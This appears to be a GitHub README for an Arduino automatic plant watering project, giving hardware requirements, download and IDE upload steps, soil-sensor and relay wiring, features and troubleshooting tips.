Welcome to the Automatic Plant Watering System project! This Arduino-based solution helps you automatically water your plants using a soil moisture sensor. It's perfect for anyone looking to maintain healthy plants without constant attention. Whether you're a student or a gardening enthusiast, this project can make your life easier.

## 🚀 Getting Started
To get started with this project, follow these steps to download and install the software.

## 💻 System Requirements
- **Arduino Board**: Compatible with Arduino UNO or similar boards.
- **Soil Moisture Sensor**: Used to detect moisture levels.
- **Relay Module**: Controls the watering system.
- **Power Supply**: Ensure you have a reliable power source for your Arduino.
- **Computer**: A computer with internet access to download the necessary files.

## 🔗 Download & Install
Visit this page to download the latest version of the software: [Releases Page](https://github.com/autonomic-skein709/Automatic_plant_watering_system-Aurdino/releases).

1. Go to the releases page.
2. Look for the latest version.
3. Click on the download link for the software.
4. Save the file to your computer.

### 📥 Installation Steps
1. **Connect your Arduino** to your computer using a USB cable.
2. **Open the Arduino IDE**.
3. **Load the downloaded sketch** (.ino file) into the IDE.
4. **Select your Arduino board's type** under the Tools menu.
5. **Select the correct COM port** that your Arduino is connected to.
6. **Click on the upload button** in the IDE to install the software onto your Arduino.

## 📦 Hardware Setup
To set up the hardware, gather the following components based on the project description:

1. **Arduino Board**: This is the brain of your system.
2. **Soil Moisture Sensor**: Insert the sensor into the soil of your plant.
3. **Relay Module**: Connect the relay module to your Arduino to control the water pump.
4. **Water Pump**: Connect the pump to the relay module to dispense water when needed.
5. **Hoses**: Use appropriate hoses to direct water to your plants.

Here’s a simple wiring guide:

- Connect the soil moisture sensor to analog pin A0.
- Connect the relay module's control pin to digital pin D2.
- Connect the water pump to the relay using the appropriate power source.

## 📊 Features
- **Automatic Watering**: It waters your plants when the moisture level drops below a certain threshold.
- **Soil Moisture Sensor**: Provides real-time readings to determine when to water.
- **Simple Setup**: Easy hardware and software installation, even for beginners.
- **Customizable Settings**: Adjust the moisture threshold in the software as per your needs.

## 🛠️ Troubleshooting
If you encounter issues while setting up your project, try the following solutions:

1. **Sensor Not Working**: Check if the sensor is properly connected to the Arduino.
2. **No Water Dispensing**: Ensure the relay module is connected correctly and the pump is functional.
3. **Code Errors**: Make sure you have selected the correct board and port in the Arduino IDE.
